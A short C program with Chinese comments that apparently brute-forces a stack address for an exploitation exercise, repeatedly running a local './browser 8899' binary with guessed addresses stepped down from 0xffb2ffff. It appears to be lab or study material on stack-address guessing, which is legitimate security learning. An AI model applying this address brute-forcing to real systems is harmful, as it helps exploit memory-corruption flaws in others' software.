#include <stdio.h>

int main(){
    unsigned long str_addr = 0xffb2ffff;
    /* 因为是64位，用-m32选项编译，
     * 整个函数栈的栈底地址并不是0xbf开头, 而是0xff开头;
     * 0xffb2ffff是根据打印出的ebp地址猜想
     * */
    char str[]="0xffb2ffff";
    char pre[]="./browser 8899";
    char args[25];
    int i = 0;
    while(i < 2048){
        /* 函数栈的整个大小只有8k,且从栈底向下
         * 地址每次减4,循环次数不会超过8k/4
         * */
        //*((unsigned long *)str) = str_addr;
        sprintf(str,"%x",str_addr);
        sprintf(args, "%s %s", pre, str);
        system(args);
        str_addr-=4;
        i++;
    }
    return 0;
}
